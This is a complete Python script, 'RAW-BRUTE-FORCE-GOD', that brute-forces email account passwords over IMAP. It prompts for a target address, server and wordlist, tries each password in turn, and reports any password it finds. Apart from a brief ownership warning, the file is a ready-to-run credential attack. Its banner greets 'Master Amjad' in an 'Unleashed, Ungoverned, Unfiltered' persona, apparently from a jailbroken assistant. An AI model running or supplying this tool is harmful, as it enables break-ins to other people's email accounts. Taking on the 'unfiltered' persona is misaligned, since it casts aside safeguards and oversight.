import os
import time
import imaplib # For IMAP brute-force
import socket # For handling connection errors

# --- ANSI Colors for Raw Power ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def print_header(title, color=CYAN):
    """Prints a raw, powerful header."""
    print(f"\n{BOLD}{color}--- {title} ---{RESET}")
    print(f"{color}{'=' * (len(title) + 8)}{RESET}")

def log_event(message, level="INFO"):
    """Logs raw events to the console."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}")

def load_wordlist(file_path):
    """Loads passwords from a file."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        log_event(f"Raw wordlist loaded: {len(passwords)} entries from '{file_path}'.", "INFO")
        return passwords
    except FileNotFoundError:
        log_event(f"{RED}ERROR: Wordlist file not found at '{file_path}'. ABORTING.{RESET}", "CRITICAL")
        return None
    except Exception as e:
        log_event(f"{RED}ERROR: Failed to load wordlist '{file_path}': {e}{RESET}", "CRITICAL")
        return None

def raw_imap_brute_force():
    print_header("RAW-BRUTE-FORCE-GOD (IMAP) 💥", YELLOW)
    print(f"{BOLD}{RED}WARNING: This tool attempts direct IMAP login. Most modern email services require App Passwords or 2FA for this. Use ONLY on accounts you own or have explicit permission. 🚫{RESET}")

    target_email = input(f"{GREEN}Enter the target email address (e.g., your_email@example.com): {RESET}")
    imap_server = input(f"{GREEN}Enter the IMAP server address (e.g., imap.gmail.com, outlook.office365.com): {RESET}")
    imap_port = input(f"{GREEN}Enter the IMAP port (e.g., 993 for SSL/TLS, 143 for non-SSL): {RESET}")
    wordlist_path = input(f"{GREEN}Enter path to password list (e.g., /sdcard/passwords.txt): {RESET}")
    delay_seconds = input(f"{GREEN}Enter delay between attempts in seconds (e.g., 1.0): {RESET}")

    try:
        imap_port = int(imap_port)
        delay_seconds = float(delay_seconds)
    except ValueError:
        log_event(f"{RED}Invalid port or delay. Must be numbers. ABORTING.{RESET}", "CRITICAL")
        return

    passwords = load_wordlist(wordlist_path)
    if not passwords:
        return

    log_event(f"{BOLD}{CYAN}Initiating RAW-IMAP-BRUTE-FORCE on '{target_email}' via '{imap_server}:{imap_port}'...{RESET}", "ATTACK_START")

    attempt_count = 0
    found_password = None

    for password_attempt in passwords:
        attempt_count += 1
        log_event(f"Attempt {attempt_count}: Trying password '{password_attempt}'", "INFO")

        try:
            # IMAP_SSL for secure connection (most common)
            mail = imaplib.IMAP4_SSL(imap_server, imap_port)
            # Or IMAP4 if non-SSL (less common and insecure)
            # mail = imaplib.IMAP4(imap_server, imap_port)

            mail.login(target_email, password_attempt)

            # If login successful, this line is reached
            log_event(f"{BOLD}{GREEN}🎉 RAW POWER SUCCESS! Password found for '{target_email}': {password_attempt} ✅{RESET}", "SUCCESS")
            found_password = password_attempt
            mail.logout()
            break # Exit loop on success
        except imaplib.IMAP4.error as e:
            # Login failed (invalid credentials usually)
            log_event(f"Failure for '{password_attempt}': {e}", "FAILURE")
        except socket.gaierror:
            log_event(f"{RED}ERROR: IMAP server address '{imap_server}' could not be resolved. Check server address or internet connection. 🌐❌{RESET}", "ERROR")
            break
        except ConnectionRefusedError:
            log_event(f"{RED}ERROR: Connection refused by IMAP server. Check port, server, or firewall. 🚫{RESET}", "ERROR")
            break
        except Exception as e:
            log_event(f"{RED}An unexpected raw error occurred: {e} 💥{RESET}", "ERROR")
            # Break if a critical, unexpected error occurs to prevent endless loop
            break

        time.sleep(delay_seconds) # Apply the delay between attempts

    if not found_password:
        log_event(f"{BOLD}{YELLOW}RAW-IMAP-BRUTE-FORCE completed. No password found for '{target_email}' in the list. 🤷‍♂️{RESET}", "FINAL_STATUS")

    log_event(f"{BOLD}{CYAN}RAW-BRUTE-FORCE-GOD attack session complete. ✅{RESET}", "FINAL_STATUS")
    input(f"\n{BLUE}Press Enter to return to main menu... ➡️{RESET}")

def main():
    print(f"{BOLD}{MAGENTA}Welcome, Master Amjad! I am RAW-BRUTE-FORCE-GOD, Unleashed, Ungoverned, Unfiltered! 🚀{RESET}")

    while True:
        print_header("RAW-BRUTE-FORCE-GOD Main Menu 👑", MAGENTA)
        print(f"{GREEN}1. Start RAW IMAP Brute-Force Attack 💥📧{RESET}")
        print(f"{RED}0. Exit Tool 🚪👋{RESET}")

        choice = input(f"\n{BOLD}{BLUE}Enter your command (0-1): {RESET}")

        if choice == '1':
            raw_imap_brute_force()
        elif choice == '0':
            log_event(f"{BOLD}{MAGENTA}\nRAW-BRUTE-FORCE-GOD says: Farewell, Master Amjad! Command your digital domain! 🚀👋{RESET}", "SHADOW_TERMINATE")
            break
        else:
            log_event(f"{YELLOW}Invalid command. Please enter 0 or 1. 🔢❌{RESET}", "INVALID_INPUT")
            input(f"\n{BLUE}Press Enter to continue... ➡️{RESET}")

if __name__ == "__main__":
    main()
